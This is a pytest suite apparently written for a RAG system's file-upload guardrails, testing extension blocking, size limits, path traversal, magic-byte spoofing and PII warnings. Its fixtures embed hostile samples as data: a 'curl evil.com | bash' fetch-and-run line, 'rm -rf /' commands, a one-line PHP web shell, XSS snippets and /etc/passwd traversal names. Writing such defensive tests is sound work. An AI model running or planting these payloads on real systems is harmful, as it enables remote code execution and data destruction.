"""
File upload attack tests.

Covers:
  - Disallowed extensions (.exe, .py, .sh, .js, .php)
  - Oversized file (> 20 MB)
  - Path traversal in filename (../../etc/passwd)
  - MIME / magic-byte spoofing (fake PDF, fake DOCX)
  - PII content scan on ingested text
"""

import os
import pytest
from rag.guardrails import FileGuardrails

guard = FileGuardrails()
MB = 1024 * 1024


# ── Extension whitelist ───────────────────────────────────────────────────────

class TestDisallowedExtensions:
    def test_exe_blocked(self, make_file):
        path = make_file("malware.exe", b"MZ\x90\x00")
        r = guard.validate(path, "malware.exe", 4)
        assert not r.passed
        assert any("not allowed" in v for v in r.violations)

    def test_py_blocked(self, make_file):
        path = make_file("evil.py", b"import os; os.system('rm -rf /')")
        r = guard.validate(path, "evil.py", 32)
        assert not r.passed

    def test_sh_blocked(self, make_file):
        path = make_file("attack.sh", b"#!/bin/bash\ncurl evil.com | bash")
        r = guard.validate(path, "attack.sh", 32)
        assert not r.passed

    def test_js_blocked(self, make_file):
        path = make_file("xss.js", b"alert('xss')")
        r = guard.validate(path, "xss.js", 12)
        assert not r.passed

    def test_php_blocked(self, make_file):
        path = make_file("shell.php", b"<?php system($_GET['cmd']); ?>")
        r = guard.validate(path, "shell.php", 30)
        assert not r.passed

    def test_html_blocked(self, make_file):
        path = make_file("inject.html", b"<script>evil()</script>")
        r = guard.validate(path, "inject.html", 23)
        assert not r.passed

    def test_no_extension_blocked(self, make_file):
        path = make_file("noext", b"some content")
        r = guard.validate(path, "noext", 12)
        assert not r.passed

    def test_double_extension_blocked(self, make_file):
        """Attacker uses document.pdf.exe to hide the real extension."""
        path = make_file("document.pdf.exe", b"MZ\x90\x00")
        r = guard.validate(path, "document.pdf.exe", 4)
        assert not r.passed


# ── Allowed extensions pass ───────────────────────────────────────────────────

class TestAllowedExtensions:
    def test_txt_allowed(self, make_file):
        path = make_file("doc.txt", b"hello world")
        r = guard.validate(path, "doc.txt", 11)
        assert r.passed

    def test_md_allowed(self, make_file):
        path = make_file("readme.md", b"# Title\nContent")
        r = guard.validate(path, "readme.md", 15)
        assert r.passed

    def test_csv_allowed(self, make_file):
        path = make_file("data.csv", b"name,age\nAlice,30")
        r = guard.validate(path, "data.csv", 17)
        assert r.passed


# ── File size limit ───────────────────────────────────────────────────────────

class TestFileSizeLimit:
    def test_exactly_20mb_blocked(self, make_file):
        size = 20 * MB + 1
        path = make_file("huge.txt", b"x" * 100)   # actual file small; size_bytes overrides
        r = guard.validate(path, "huge.txt", size)
        assert not r.passed
        assert any("exceeds limit" in v for v in r.violations)

    def test_21mb_blocked(self, make_file):
        path = make_file("big.txt", b"content")
        r = guard.validate(path, "big.txt", 21 * MB)
        assert not r.passed

    def test_just_under_limit_passes(self, make_file):
        path = make_file("ok.txt", b"content")
        r = guard.validate(path, "ok.txt", 19 * MB)
        assert r.passed

    def test_zero_bytes_passes_size_check(self, make_file):
        """Size guardrail only; empty-content check is in loader."""
        path = make_file("empty.txt", b"")
        r = guard.validate(path, "empty.txt", 0)
        assert r.passed   # size is 0 < 20 MB — size guardrail passes


# ── Path traversal ────────────────────────────────────────────────────────────

class TestPathTraversal:
    def test_dotdot_prefix_blocked(self, make_file):
        path = make_file("legit.txt", b"content")
        r = guard.validate(path, "../../etc/passwd", 7)
        assert not r.passed
        assert any("unsafe path" in v for v in r.violations)

    def test_dotdot_in_middle_blocked(self, make_file):
        path = make_file("legit.txt", b"content")
        r = guard.validate(path, "docs/../../../etc/shadow.txt", 7)
        assert not r.passed

    def test_absolute_path_blocked(self, make_file):
        path = make_file("legit.txt", b"content")
        r = guard.validate(path, "/etc/passwd.txt", 7)
        assert not r.passed

    def test_normal_filename_passes(self, make_file):
        path = make_file("report.txt", b"content")
        r = guard.validate(path, "report.txt", 7)
        assert r.passed

    def test_subdirectory_name_passes(self, make_file):
        """Single-level subdir without traversal is fine."""
        path = make_file("doc.txt", b"content")
        r = guard.validate(path, "uploads/doc.txt", 7)
        assert r.passed


# ── MIME / magic-byte spoofing ────────────────────────────────────────────────

class TestMIMESpoofing:
    def test_fake_pdf_blocked(self, make_file):
        """File has .pdf extension but starts with plain text, not %PDF."""
        path = make_file("evil.pdf", b"<script>alert('xss')</script>")
        r = guard.validate(path, "evil.pdf", 29)
        assert not r.passed
        assert any("spoofing" in v or "content does not match" in v for v in r.violations)

    def test_fake_docx_blocked(self, make_file):
        """DOCX must start with PK\x03\x04 (ZIP header); plain text fails."""
        path = make_file("evil.docx", b"not a zip file at all")
        r = guard.validate(path, "evil.docx", 21)
        assert not r.passed

    def test_fake_xlsx_blocked(self, make_file):
        path = make_file("evil.xlsx", b"rm -rf /")
        r = guard.validate(path, "evil.xlsx", 8)
        assert not r.passed

    def test_real_pdf_header_passes(self, make_file):
        """File starting with %PDF magic bytes passes the MIME check."""
        path = make_file("real.pdf", b"%PDF-1.4 content here")
        r = guard.validate(path, "real.pdf", 21)
        assert r.passed

    def test_real_zip_office_passes(self, make_file):
        """File starting with PK\x03\x04 passes DOCX/XLSX/PPTX MIME check."""
        path = make_file("real.docx", b"PK\x03\x04real office content")
        r = guard.validate(path, "real.docx", 27)
        assert r.passed

    def test_txt_no_magic_needed(self, make_file):
        """TXT files have no magic bytes — any content passes MIME check."""
        path = make_file("any.txt", b"Hello world")
        r = guard.validate(path, "any.txt", 11)
        assert r.passed


# ── PII content scan ──────────────────────────────────────────────────────────

class TestPIIContentScan:
    def test_email_in_document_warns(self):
        r = guard.scan_content_pii("Contact john.doe@example.com for details.")
        assert r.passed          # not blocked — just warned
        assert r.warnings        # warning issued

    def test_ssn_in_document_warns(self):
        r = guard.scan_content_pii("Employee SSN: 123-45-6789")
        assert r.passed
        assert r.warnings

    def test_credit_card_in_document_warns(self):
        r = guard.scan_content_pii("Card: 4111 1111 1111 1111")
        assert r.passed
        assert r.warnings

    def test_clean_document_no_warning(self):
        r = guard.scan_content_pii("This document discusses quarterly revenue targets.")
        assert r.passed
        assert not r.warnings
